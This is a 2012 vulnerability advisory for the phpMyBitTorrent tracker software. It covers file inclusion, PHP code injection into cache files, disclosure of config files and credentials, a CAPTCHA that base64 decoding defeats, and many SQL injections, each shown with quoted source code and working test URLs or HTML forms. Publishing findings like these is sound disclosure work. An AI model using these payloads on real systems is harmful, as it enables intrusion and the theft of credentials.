Date: 01. October 2012
Location: Estonia, Tartu
Web: http://www.waraxe.us/advisory-91.html


Description of vulnerable target:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

phpMyBitTorrent is the brand new Open Source solution for BitTorrent
communities! phpMyBitTorrent is all written in PHP, uses the popular MySQL
database and support every BitTorrent protocol extension. 

https://www.phpmybittorrent.com/

http://sourceforge.net/projects/phpmybittorrent/


###############################################################################
1. Local File Inclusion in "include/config.php"
###############################################################################

Reasons: insufficient sanitization of user-supplied data
Attack vectors:
 1. user-supplied cookie parameters "bttheme" and "btlanguage"
 2. user-supplied parameter "theme_change"
Preconditions:
 1. magic_quotes_gpc=off
 2. PHP must be < 5.3.4 for null-byte attacks to work


PHP script "include/config.php" line 56:
------------------------[ source code start ]----------------------------------
if (!isset($_COOKIE["bttheme"])) $bttheme = "";
if (!isset($_COOKIE["btlanguage"])) $btlanguage = "";
...
if (isset($btlanguage) AND is_readable("language/".$btlanguage.".php")) 
  $language = $btlanguage;
if (isset($bttheme) AND is_readable("themes/".$bttheme."/main.php"))
  $theme = $bttheme;
...
if (file_exists("./language/".$language.".php"))
        require_once("./language/".$language.".php");
...
if (file_exists("./themes/".$theme."/main.php")) {
        require_once("./themes/".$theme."/main.php");
------------------------[ source code end ]------------------------------------

Test cookies:

bttheme=../avatars/user/waraxe.jpg%00z;
btlanguage=../avatars/user/waraxe.jpg%00z;


PHP script "include/config.php" line 199:
------------------------[ source code start ]----------------------------------
if (isset($theme_change)){
  $bttheme = $theme_change;
...
if (isset($bttheme) AND is_readable("themes/".$bttheme."/main.php")) $theme =
   $bttheme;
...
if (file_exists("./themes/".$theme."/main.php")) {
        require_once("./themes/".$theme."/main.php");
------------------------[ source code end ]------------------------------------

Test:

http://pmbt//?theme_change=../avatars/user/waraxe.jpg%00z


###############################################################################
2. Insecure cache file handling in "blocks/newestmember_block.php"
###############################################################################

Reasons:
 1. unrestricted direct access to the cache file
 2. uninitialized variable "$newestmemberrecords"
Attack vector: user-supplied parameter "newestmemberrecords"
Preconditions: none
Result:
 1. last 5 registered users credentials leakage
 2. attacker is able to inject php code to the cache file

 
PHP script "blocks/newestmember_block.php" line 35:
------------------------[ source code start ]----------------------------------
$file = "cache/cache_newestmemberblock.txt";
$expire = 60; // time in seconds
if (file_exists($file) &&
    filemtime($file) > (time() - $expire)) {
    $newestmemberrecords = unserialize(file_get_contents($file));
}else{ 
       WHERE active = 1 AND ban =&#039;0&#039; ORDER BY id DESC LIMIT 5");
    
    while ($newestmemberrecord = $db->sql_fetchrow($newestmemberquery) ) {
        $newestmemberrecords[] = $newestmemberrecord;
    }
    $OUTPUT = serialize($newestmemberrecords);
    $fp = fopen($file,"w");
    fputs($fp, $OUTPUT);
    fclose($fp);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/cache/cache_newestmemberblock.txt

Result:
-------------------------[ result start ]--------------------------------------
a:1:{i:0;a:116:{i:0;s:1:"1";s:2:"id";s:1:"1";i:1;s:6:"waraxe";
...
s:8:"password";s:32:"123456789123456789123456789abcde";
-------------------------[ result end ]----------------------------------------

As result, anyone can obtain usernames and hashed passwords of last 5 registered
users and then try to crack md5 hashes or forge session cookies, resulting in
account overtaking. Additionally it is possible to inject arbitrary data to the
cache file, including php code:

http://pmbt/?newestmemberrecords[][username]=war<?php+phpinfo();?>axe

After that let&#039;s look at cache file:

http://pmbt/cache/cache_newestmemberblock.txt

Result:
-------------------------[ result start ]--------------------------------------
a:2:{i:0;a:1:{s:8:"username";s:24:"war<?php phpinfo();?>axe";}
-------------------------[ result end ]----------------------------------------

Attacker can combine php code injection to cache file with Local File Inclusion
vulnerabilities and obtain PHP-level access to remote system.


###############################################################################
3. Insecure cache file handling in "staff.php"
###############################################################################

Reason: uninitialized variable "$staff_table"
Attack vector: user-supplied parameter "staff_table"
Preconditions: none
Result: attacker is able to inject php code to the cache file

 
PHP script "staff.php" line 38:
------------------------[ source code start ]----------------------------------
$cache_file = "cache/staff.txt";
...
$staff_table[ $arr[&#039;level&#039;] ] = $staff_table[ $arr[&#039;level&#039;] ]
...
$fp = fopen($cache_file, &#039;w&#039;);
fwrite($fp, serialize($staff_table));
fclose($fp);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/staff.php?staff_table[]=<?php+phpinfo();?>

Result:

http://pmbt/cache/staff.txt

-------------------------[ result start ]--------------------------------------
a:2:{i:0;s:18:"<?php phpinfo();?>";s:5:"admin";s:325:"
-------------------------[ result end ]----------------------------------------


###############################################################################
4. Remote File Disclosure in "ajax.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "torrent"
Preconditions:
 1. magic_quotes_gpc=off
 2. PHP must be < 5.3.4 for null-byte attacks to work
Result: attacker can disclose the contents of arbitrary files

 
PHP script "ajax.php" line 1770:
------------------------[ source code start ]----------------------------------
case &#039;view_nfo_page&#039;:{
  $nfo = "";
  $nf = fopen("torrent/".$_GET[&#039;torrent&#039;].".nfo","rb");
  while (!feof($nf)) $nfo .= fread($nf,100);
  fclose($nf);
  OpenTable("NFO");
  echo "<p class=\"nfo\">".nl2br(str_replace(" ","&nbps;",htmlentities($nfo)))
    ."</p>";
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/ajax.php?op=view_nfo_page&torrent=../include/configdata.php%00z

As result we can see various sensitive configuration data, including plaintext
database credentials.


###############################################################################
5. Insecure CAPTCHA implementation in "gfxgen.php"
###############################################################################

Reason: weak cryptography
Result: automated tools can bypass CAPTCHA restrictions

PHP script "gfxgen.php" line 34:
------------------------[ source code start ]----------------------------------
$code = base64_decode($_GET["code"]);
$image = ImageCreateFromJPEG("include/code_bg.jpg");
$text_color = ImageColorAllocate($image, 80, 80, 80);
Header("Content-type: image/jpeg");
ImageString ($image, 5, 12, 2, $code, $text_color);
ImageJPEG($image, &#039;&#039;, 75);
ImageDestroy($image);
------------------------[ source code end ]------------------------------------

As we can see, reversible base64 encoding algorithm is used in default CAPTCHA
implementation. Let&#039;s look at login page with enabled CAPTCHA:

------------------------[ source code start ]----------------------------------
<p align="center">Security Code<br>
<img src="gfxgen.php?code=Q0k2RE8=" alt="Security Code">
------------------------[ source code end ]------------------------------------

Parameter "code" has value "Q0k2RE8=" and after base64 decoding we have "CI6DO"
, so it&#039;s obvious, that current CAPTCHA impementation in phpMyBitTorrent is
completely useless.


###############################################################################
6. Multiple SQL Injections in "ajax.php"
###############################################################################

--># Case 1 #<--
Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "username"
Preconditions:
 1. magic_quotes_gpc=off
 2. logged in as user
Result: attacker can manipulate database queries

 
PHP script "ajax.php" line 165:
------------------------[ source code start ]----------------------------------
case "check_username": {
 if (!$user->user) loginrequired("user",true);
...
 // check for that username
  = &#039;".$_GET[&#039;username&#039;]."&#039;";
 $res = $db->sql_query($sql);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/ajax.php?op=check_username&username=war&#039;axe


--># Case 2 #<--
Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied parameter "to"
Preconditions:
 1. magic_quotes_gpc=off
Result: attacker can manipulate database queries

 
PHP script "ajax.php" line 192:
------------------------[ source code start ]----------------------------------
case &#039;private__chat&#039;:{
...
$sql = "SELECT S.*, U.id as uid, U.can_do as can_do, U.donator AS donator, 
 U.warned as warned, U.level as level, IF(U.name IS NULL, U.username, U.name)
 S.user = U.id WHERE S.id_to =&#039;".$to."&#039; AND S.user = &#039;".$user->id."&#039; OR 
 S.user=&#039;".$to."&#039; AND S.id_to =&#039;".$user->id."&#039; ORDER BY posted DESC LIMIT
 ".$shout_config[&#039;shouts_to_show&#039;].";";
                $shoutres = $db->sql_query($sql) or btsqlerror($sql);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/ajax.php?op=private__chat&to=-1&#039;UNION+SELECT+1,2,@@version,4,5,6,7,8,9,10,11%23    


--># Case 3 #<--
Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied parameter "shotuser"
Preconditions:
 1. magic_quotes_gpc=off
 2. logged in as user with shout privileges
Result: attacker can manipulate database queries

 
PHP script "ajax.php" line 368:
------------------------[ source code start ]----------------------------------
case &#039;view_shout&#039;:{
...
if(isset($shotuser)){
 $privateonly = "WHERE S.id_to =&#039;".$shotuser."&#039; AND S.user =
 &#039;".$user->id."&#039; OR  S.id_to =&#039;".$user->id."&#039; AND S.user = &#039;".$shotuser."&#039;";
...
$sql = "SELECT S.*, U.id as uid, U.can_do as can_do, U.donator AS donator, 
U.warned as warned, U.level as level, IF(U.name IS NULL, U.username, U.name)
 S.user = U.id ".$privateonly." ORDER BY posted DESC LIMIT 
 ".$shout_config[&#039;shouts_to_show&#039;].";";
$shoutres = $db->sql_query($sql) or btsqlerror($sql);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/ajax.php?op=view_shout&shotuser=&#039;UNION+SELECT+1,2,@@version,4,0,6,7,8,9,10,11%23


--># Case 4 #<--
Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "shout"
Preconditions:
 1. magic_quotes_gpc=off
Result: attacker can manipulate database queries

 
PHP script "ajax.php" line 513:
------------------------[ source code start ]----------------------------------
case &#039;take_delete_shout&#039;:{
  `id` = &#039;".$_GET[&#039;shout&#039;]."&#039;";
  $res = $db->sql_query($sql) or btsqlerror($sql);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/ajax.php?op=take_delete_shout&shout=war&#039;axe

Result:

You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near &#039;axe&#039;&#039; at line 1


--># Case 5 #<--
Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "shout"
Preconditions:
 1. magic_quotes_gpc=off
Result: attacker can manipulate database queries

 
PHP script "ajax.php" line 528:
------------------------[ source code start ]----------------------------------
case &#039;take_delete_archive_shout&#039;:{
  `id` = &#039;".$_GET[&#039;shout&#039;]."&#039;";
  $res = $db->sql_query($sql) or btsqlerror($sql);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/ajax.php?op=take_delete_archive_shout&shout=war&#039;axe

Result:

You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near &#039;axe&#039;&#039; at line 1


--># Case 6 #<--
Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "shout"
Preconditions:
 1. magic_quotes_gpc=off
Result: attacker can manipulate database queries

 
PHP script "ajax.php" line 550:
------------------------[ source code start ]----------------------------------
case &#039;take_edit_shout&#039;:{
...
  `id` = &#039;".$_GET[&#039;shout&#039;]."&#039;";
  $res = $db->sql_query($sql) or btsqlerror($sql);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/ajax.php?op=take_edit_shout&shout=war&#039;axe

Result:

You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near &#039;axe&#039;&#039; at line 1


--># Case 7 #<--
Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "shout"
Preconditions:
 1. magic_quotes_gpc=off
Result: attacker can manipulate database queries

 
PHP script "ajax.php" line 572:
------------------------[ source code start ]----------------------------------
case &#039;take_edit_archive_shout&#039;:{
...
 `id` = &#039;".$_GET[&#039;shout&#039;]."&#039;";
 $res = $db->sql_query($sql) or btsqlerror($sql);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/ajax.php?op=take_edit_archive_shout&shout=war&#039;axe

Result:

You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near &#039;axe&#039;&#039; at line 1


--># Case 8 #<--
Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "pass"
Preconditions:
 1. magic_quotes_gpc=off
 2. logged in as user
Result: attacker can manipulate database queries

 
PHP script "ajax.php" line 1116:
------------------------[ source code start ]----------------------------------
case &#039;view_peers_page&#039;:{
...
  &#039;".$_GET[&#039;torrent&#039;]."&#039; AND (password IS NULL OR password =
  &#039;".$_GET["pass"]."&#039;) LIMIT 1;";
 $res = $db->sql_query($sql);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/ajax.php?op=view_peers_page&torrent=1&pass=war&#039;axe


--># Case 9 #<--
Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "pass"
Preconditions: none
Result: attacker can manipulate database queries


PHP script "ajax.php" line 1286:
------------------------[ source code start ]----------------------------------
case &#039;view_files_page&#039;:{
...
 $password= (isset($_GET["pass"]))? $_GET["pass"] : &#039;&#039;;
...
 $password = urldecode($password);
 (password IS NULL OR password = &#039;".$password."&#039;) LIMIT 1;";
 $res = $db->sql_query($sql);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/ajax.php?op=view_files_page&torrent=1&pass=war%2527axe


--># Case 10 #<--
Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "torrent"
Preconditions:
 1. magic_quotes_gpc=off
 2. logged in as user
Result: attacker can manipulate database queries


PHP script "ajax.php" line 1340:
------------------------[ source code start ]----------------------------------
case &#039;view_rate_page&#039;:{
...
if ($_GET["owner"] != $user->id AND ($user->user)) {
 torrent = &#039;".$_GET[&#039;torrent&#039;]."&#039; AND user = &#039;" . $user->id."&#039;") or btsqlerror
...
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/ajax.php?op=view_rate_page&torrent=war&#039;axe


--># Case 11 #<--
Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "torrent"
Preconditions:
 1. magic_quotes_gpc=off
Result: attacker can manipulate database queries

 
PHP script "ajax.php" line 1476:
------------------------[ source code start ]----------------------------------
case &#039;view_details_page&#039;:{
...
 $sql = "SELECT A.id as id, A.exeem, A.seeders, A.leechers, A.tot_peer, A.speed
...
 WHERE A.id = &#039;".$_GET[&#039;torrent&#039;]."&#039; GROUP BY A.id LIMIT 1;";
 $res = $db->sql_query($sql) or btsqlerror($sql);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/ajax.php?op=view_details_page&torrent=war&#039;axe

Result:

You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near &#039;axe&#039; GROUP BY A.id
LIMIT 1&#039; at line 1


--># Case 12 #<--
Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "torrent"
Preconditions:
 1. magic_quotes_gpc=off
Result: attacker can manipulate database queries

 
PHP script "ajax.php" line 1783:
------------------------[ source code start ]----------------------------------
case &#039;view_details&#039;:{
...
 $sql = "SELECT A.id as id, A.exeem, A.seeders, A.leechers, A.tot_peer, A.speed
...
 WHERE A.id = &#039;".$_GET[&#039;torrent&#039;]."&#039; GROUP BY A.id LIMIT 1;";
 $res = $db->sql_query($sql) or btsqlerror($sql);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/ajax.php?op=view_details&torrent=war&#039;axe

Result:

You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near &#039;axe&#039; GROUP BY A.id
LIMIT 1&#039; at line 1


--># Case 13 #<--
Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "shout"
Preconditions:
 1. magic_quotes_gpc=off
Result: attacker can manipulate database queries

 
PHP script "ajax.php" line 2067:
------------------------[ source code start ]----------------------------------
case &#039;archivedeleteshout&#039;:{
 `id` = &#039;".$_GET[&#039;shout&#039;]."&#039;";
$res = $db->sql_query($sql) or btsqlerror($sql);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/ajax.php?op=archivedeleteshout&shout=war&#039;axe

Result:

You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near &#039;axe&#039;&#039; at line 1


--># Case 14 #<--
Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "torrent"
Preconditions:
 1. magic_quotes_gpc=off
Result: attacker can manipulate database queries

 
PHP script "ajax.php" line 2083:
------------------------[ source code start ]----------------------------------
case &#039;get_imdb&#039;:{
require ("imdb/imdb.class.php");
$sql = "SELECT A.id as id, A.exeem, A.seeders, A.leechers, A.tot_peer, A.speed
...
WHERE A.id = &#039;".$_GET[&#039;torrent&#039;]."&#039; GROUP BY A.id LIMIT 1;";
$res = $db->sql_query($sql) or btsqlerror($sql);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/ajax.php?op=get_imdb&torrent=war&#039;axe

Result:

You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near &#039;axe&#039; GROUP BY A.id
LIMIT 1&#039; at line 1


--># Case 15 #<--
Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "search"
Preconditions:
 1. magic_quotes_gpc=off
 2. logged in as user
Result: attacker can manipulate database queries

 
PHP script "ajax.php" line 2207:
------------------------[ source code start ]----------------------------------
case &#039;member_search&#039;:{
...
if ( isset( $_GET[&#039;search&#039;] ) && !empty( $_GET[&#039;search&#039;] ) ){
 $query = "username LIKE (&#039;%$search%&#039;) AND active=&#039;1&#039;";
...
 or sqlerr();
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/ajax.php?op=member_search&search=war&#039;axe

Result:

You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near &#039;axe%&#039;) AND active=&#039;1&#039;


###############################################################################
7. SQL Injection in "backend.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied parameter "cat"
Preconditions: none
Result: attacker can manipulate database queries

 
PHP script "backend.php" line 176:
------------------------[ source code start ]----------------------------------
case "category": {
...
  WHERE id = ".$cat."";
  $res = $db->sql_query($sql_cat);
------------------------[ source code end ]------------------------------------

Tests:

http://pmbt/backend.php?op=category&cat=0+UNION+SELECT+@@version%23

http://pmbt/backend.php?op=category&cat=0+UNION+SELECT+password+FROM+
torrent_users+WHERE+id=1%23


###############################################################################
8. SQL Injection in "casino_player_edit.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied parameter "player"
Preconditions:
 1. magic_quotes_gpc=off
Result: attacker can manipulate database queries

 
PHP script "casino_player_edit.php" line 36:
------------------------[ source code start ]----------------------------------
 &#039;".$player."&#039;") or die(mysql_error());
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/casino_player_edit.php?player=war&#039;axe

Result:

You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near &#039;axe&#039;&#039; at line 1


###############################################################################
9. SQL Injection in "deloffer.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied POST parameter "offerid"
Preconditions: none
Result: attacker can manipulate database queries

 
PHP script "deloffer.php" line 34:
------------------------[ source code start ]----------------------------------
$id = $_POST["offerid"];
 id=$id");
------------------------[ source code end ]------------------------------------

Test:
-------------------------[ test code start ]-----------------------------------
<html><body><center>
<form action="http://pmbt/deloffer.php" method="post">
<input type="hidden" name="offerid" value="waraxe">
<input type="submit" value="Test">
</form>
</center></body></html>
--------------------------[ test code end ]------------------------------------


###############################################################################
10. SQL Injection in "edit.php"
###############################################################################

Reason:
 1. insufficient sanitization of user-supplied data
 2. uninitialized variable "$id"
Attack vector: user-supplied parameters "torrent_id" and "id"
Preconditions:
 1. magic_quotes_gpc=off
 2. logged in as user
Result: attacker can manipulate database queries

 
PHP script "edit.php" line 37:
------------------------[ source code start ]----------------------------------
if (isset($torrent_id)) $id = $torrent_id;
...
if (is_array($id))
{
foreach($id as $item)
{
$res = $db->sql_query($sql) or btsqlerror($sql);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/edit.php?id[]=war&#039;axe
http://pmbt/edit.php?torrent_id[]=war&#039;axe

Result:

You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near &#039;axe&#039;&#039; at line 1


###############################################################################
11. SQL Injection in "frame.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied parameter "password"
Preconditions: none
Result: attacker can manipulate database queries


PHP script "frame.php" line 80:
------------------------[ source code start ]----------------------------------
case "filelist": {
 if (!isset($id) OR !is_numeric($id) OR $id < 1) error(_bterridnotset);
 $password = urldecode($password);
  (password IS NULL OR password = &#039;".$password."&#039;) LIMIT 1;";
 $res = $db->sql_query($sql);
------------------------[ source code end ]------------------------------------

Tests:

http://pmbt/frame.php?op=filelist&id=1&password=war%2527axe
http://pmbt/frame.php?op=commentlist&id=1&password=war%2527axe
http://pmbt/frame.php?op=peerlist&id=1&password=war%2527axe

Result:

You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near &#039;axe&#039;) LIMIT 1&#039; at line 1


###############################################################################
12. SQL Injection in "helpdesk.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied parameters "title", "problem", "category" and
"priority"
Preconditions:
 1. magic_quotes_gpc=off (for parameters "title", "problem" and "priority")
Result: attacker can manipulate database queries


PHP script "helpdesk.php" line 120:
------------------------[ source code start ]----------------------------------
$problem = (isset($_POST["problem"])) ? trim($_POST["problem"]) : false;
if ($op == "ticket" ){
...
 `category`, `priority`, `open_date`) VALUES  (&#039;".$user->id."&#039;, &#039;".$title."&#039;, 
  &#039;".$problem."&#039;, ".$category.", &#039;".$priority."&#039;, NOW())";
$db->sql_query($upd_sql) or btsqlerror($upd_sql);
------------------------[ source code end ]------------------------------------

Test:
-------------------------[ test code start ]-----------------------------------
<html><body><center>
<form action="http://pmbt/helpdesk.php?op=ticket" method="post">
<input type="hidden" name="problem" value="1">
<input type="hidden" name="title" value="2">
<input type="hidden" name="category" value="waraxe">
<input type="hidden" name="priority" value="3">
<input type="submit" value="Test">
</form>
</center></body></html>
--------------------------[ test code end ]------------------------------------

Result:

Unknown column &#039;waraxe&#039; in &#039;field list&#039;


###############################################################################
13. SQL Injection in "hitruns.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied POST parameters "reset" and "warn"
Preconditions: none
Result: attacker can manipulate database queries

 
PHP script "hitruns.php" line 94:
------------------------[ source code start ]----------------------------------
if (isset($_POST["reset"])) {
hitrun = &#039;0000-00-00 00:00:00&#039;, hitrunwarn = &#039;no&#039; WHERE id 
IN (".implode(", ", $_POST["reset"]).")") or sqlerr();
------------------------[ source code end ]------------------------------------

Test:
-------------------------[ test code start ]-----------------------------------
<html><body><center>
<form action="http://pmbt/hitruns.php" method="post">
<input type="hidden" name="reset[]" value="waraxe">
<input type="submit" value="Test">
</form>
</center></body></html>
--------------------------[ test code end ]------------------------------------

Result:

Unknown column &#039;waraxe&#039; in &#039;field list&#039;

PHP script "hitruns.php" line 101:
------------------------[ source code start ]----------------------------------
} elseif (isset($_POST["warn"])) {
$userids = $warnids = array();
WHERE id IN (".implode(", ", $_POST["warn"]).")") or sqlerr();
------------------------[ source code end ]------------------------------------

Test:
-------------------------[ test code start ]-----------------------------------
<html><body><center>
<form action="http://pmbt/hitruns.php" method="post">
<input type="hidden" name="warn[]" value="waraxe">
<input type="submit" value="Test">
</form>
</center></body></html>
--------------------------[ test code end ]------------------------------------

Result:

Unknown column &#039;waraxe&#039; in &#039;where clause&#039;


###############################################################################
14. SQL Injection in "makepoll.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied POST parameters "pollid", "question", "option0",
 "option1","option2","option3","option4","option5","option6","option7",
 "option8","option9", "sort"
Preconditions:
 1. magic_quotes_gpc=off (for parameters "question", "option0", "option1",
  "option2","option3","option4","option5","option6","option7", "option8",
  "option9", "sort")
Result: attacker can manipulate database queries

 
PHP script "makepoll.php" line 54:
------------------------[ source code start ]----------------------------------
$pollid = $_POST["pollid"];
$question = $_POST["question"];
$option0 = $_POST["option0"];
$option1 = $_POST["option1"];
$option2 = $_POST["option2"];
$option3 = $_POST["option3"];
$option4 = $_POST["option4"];
$option5 = $_POST["option5"];
$option6 = $_POST["option6"];
$option7 = $_POST["option7"];
$option8 = $_POST["option8"];
$option9 = $_POST["option9"];
$sort = $_POST["sort"];
$returnto = $_POST["returnto"];

if (!$question || !$option0 || !$option1)
  bterror(_btpolls_missing,_bterror);

if ($pollid)
  
        "question = &#039;" . $question . "&#039;, " .
        "option0 = &#039;" . $option0 . "&#039;, " .
        "option1 = &#039;" . $option1 . "&#039;, " .
        "option2 = &#039;" . $option2 . "&#039;, " .
        "option3 = &#039;" . $option3 . "&#039;, " .
        "option4 = &#039;" . $option4 . "&#039;, " .
        "option5 = &#039;" . $option5 . "&#039;, " .
        "option6 = &#039;" . $option6 . "&#039;, " .
        "option7 = &#039;" . $option7 . "&#039;, " .
        "option8 = &#039;" . $option8 . "&#039;, " .
        "option9 = &#039;" . $option9 . "&#039;, " .
        "sort = &#039;" . $sort . "&#039; " .
    "WHERE id = $pollid") or die(mysql_error(__FILE__, __LINE__));
------------------------[ source code end ]------------------------------------

Test:

-------------------------[ test code start ]-----------------------------------
<html><body><center>
<form action="http://pmbt/makepoll.php" method="post">
<input type="hidden" name="pollid" value="waraxe">
<input type="hidden" name="question" value="1">
<input type="hidden" name="option0" value="2">
<input type="hidden" name="option1" value="3">
<input type="submit" value="Test">
</form>
</center></body></html>
--------------------------[ test code end ]------------------------------------

Result:

Unknown column &#039;waraxe&#039; in &#039;where clause&#039;


###############################################################################
15. SQL Injection in "modrules.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "id"
Preconditions: none
Result: attacker can manipulate database queries

 
PHP script "modrules.php" line 40:
------------------------[ source code start ]----------------------------------
$id = (isset($_GET["id"]))? $_GET["id"] : &#039;&#039;;
...
if (!$db->sql_query($sql)) btsqlerror($sql);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/modrules.php?act=delete&id=waraxe

Result:

Unknown column &#039;waraxe&#039; in &#039;where clause&#039;


###############################################################################
16. SQL Injection in "mybonus.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied POST parameter "option"
Preconditions:
 1. magic_quotes_gpc=off
Result: attacker can manipulate database queries

 
PHP script "mybonus.php" line 91:
------------------------[ source code start ]----------------------------------
if ($action == "exchange") {
...
$option = $_POST["option"];
...
$res = $db->sql_query($sql);
------------------------[ source code end ]------------------------------------

Test:
-------------------------[ test code start ]-----------------------------------
<html><body><center>
<form action="http://pmbt/mybonus.php" method="post">
<input type="hidden" name="action" value="exchange">
<input type="hidden" name="option" value="war&#039;axe">
<input type="submit" value="Test">
</form>
</center></body></html>
--------------------------[ test code end ]------------------------------------


###############################################################################
17. SQL Injection in "problems.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied parameter "t"
Preconditions: none
Result: attacker can manipulate database queries

 
PHP script "problems.php" line 62:
------------------------[ source code start ]----------------------------------
if(isset($_POST[&#039;delete&#039;]) AND $_POST[&#039;delete&#039;]==&#039;Delete&#039;)
{
foreach($t as $tid=>$action)
{
  LIMIT 1");
------------------------[ source code end ]------------------------------------

Test:
-------------------------[ test code start ]-----------------------------------
<html><body><center>
<form action="http://pmbt/problems.php" method="post">
<input type="hidden" name="delete" value="Delete">
<input type="hidden" name="t[waraxe]" value="1">
<input type="submit" value="Test">
</form>
</center></body></html>
--------------------------[ test code end ]------------------------------------

Result:

Unknown column &#039;waraxe&#039; in &#039;where clause&#039;


###############################################################################
18. SQL Injection in "polls.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "pollid"
Preconditions: none
Result: attacker can manipulate database queries

 
PHP script "polls.php" line 38:
------------------------[ source code start ]----------------------------------
$pollid = $_GET["pollid"];
...
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/polls.php?action=delete&sure=1&pollid=waraxe

Result:

Unknown column &#039;waraxe&#039; in &#039;where clause&#039;


###############################################################################
19. SQL Injection in "scrape-external.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "tracker"
Preconditions:
 1. logged in as user
 2. magic_quotes_gpc=off
Result: attacker can manipulate database queries

 
PHP script "scrape-external.php" line 34:
------------------------[ source code start ]----------------------------------
$url2 =  $_GET["tracker"];
...
    WHERE url = &#039;".$url2."&#039; LIMIT 1;";
$res = $db->sql_query($sql) or btsqlerror($sql);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/scrape-external.php?id=1&tracker=&#039;UNION+SELECT+@@version,&#039;1


###############################################################################
20. SQL Injection in "shoutboxarchive.php"
###############################################################################

Reason: uninitialized variable "$lookforcount"
Attack vector: user-supplied parameter "lookforcount"
Preconditions: none
Result: attacker can manipulate database queries

 
PHP script "shoutboxarchive.php" line 77:
------------------------[ source code start ]----------------------------------
if(isset($search))
{
...
  $lookforcount = $searchtime.$searchword.$uidsearch." AND ";
}
...
 WHERE ".$lookforcount."(id_to = &#039;0&#039; OR id_to = &#039;".$user->id."&#039;);";
$totres = $db->sql_query($totsql)or btsqlerror($totsql);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/shoutboxarchive.php?lookforcount=waraxe=1%23

Result:

Unknown column &#039;waraxe&#039; in &#039;where clause&#039;


###############################################################################
21. SQL Injection in "slove.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied parameters "tid", "cid", "rid" and "id"
Preconditions:
 1. magic_quotes_gpc=off (for parameters "cid", "rid" and "id")
Result: attacker can manipulate database queries

 
PHP script "slove.php" line 41:
------------------------[ source code start ]----------------------------------
...
if(isset($trans_alert))$db->sql_query("INSERT INTO 
  VALUES (NOW(), 0, $rid, &#039;Help Desk&#039;, &#039;$msg&#039;)") ;
...
$result=$db->sql_query($sql);
------------------------[ source code end ]------------------------------------

Tests:

http://pmbt/slove.php?cid=1&tid=waraxe
http://pmbt/slove.php?cid=war&#039;axe&tid=1
http://pmbt/slove.php?tid=123&rid=war&#039;axe
